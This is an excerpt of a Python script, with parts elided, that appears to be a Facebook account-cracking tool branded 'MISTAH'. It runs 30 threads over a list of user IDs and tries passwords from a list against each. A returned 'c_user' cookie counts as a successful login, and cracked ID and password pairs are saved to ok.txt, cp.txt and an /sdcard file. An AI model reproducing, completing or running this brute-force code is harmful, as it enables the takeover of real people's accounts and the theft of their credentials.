...
def v1():
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        print(logo)
        tl = str(len(user))
        print(' [MISTAH]  Total ids:\033[1;92m '+tl)
        print(f"\033[1;97m [MISTAH]  Target Doamin:\033[1;92m {doamin}")
        print(' \033[1;97m[MISTAH]  The process has been started')
        print(' [MISTAH]  Wait for ids ')
        print(50*'_')
        for guru in user:
    ...
    print(50*'_')
    print(' [MISTAH] Crack process has been completed')
    print(' [MISTAH] Ids saved in ok.txt,cp.txt')
    print(50*'_')
def v2():
    user=[]
    os.system('clear')
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        tl = str(len(user))
        print(' [MISTAH]  Total ids:\033[1;92m '+tl)
        print(f"\033[1;97m [MISTAH]  Target Doamin:\033[1;92m Facebook CLONING (name)")
        print(' \033[1;97m[MISTAH]  The process has been started')
        print(' [MISTAH]  Wait for ids ')
        print(50*'_')
        for guru in user:
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/MISTAH-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
